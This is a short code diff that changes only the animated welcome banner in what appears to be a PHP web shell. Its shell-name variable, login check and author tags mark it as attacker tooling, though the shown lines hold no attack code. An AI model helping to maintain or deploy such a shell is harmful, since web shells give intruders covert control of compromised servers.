@@ -804,10 +804,10 @@ if (empty($_SESSION['login'])) {
     /*NuLz Ganteng*/
     typewriter
         .pauseFor(500)
-        .typeString("Welcome To <?=$s_he_ll_Name?>")
+        .typeString("Selamat datang tuan")
         .pauseFor(2000)
         .deleteChars(26)
-        .typeString("Created By NuLz & Omest")
+        .typeString("ada yang bisa di bantu ?")
         .pauseFor(2000)
         .start();
     </script>
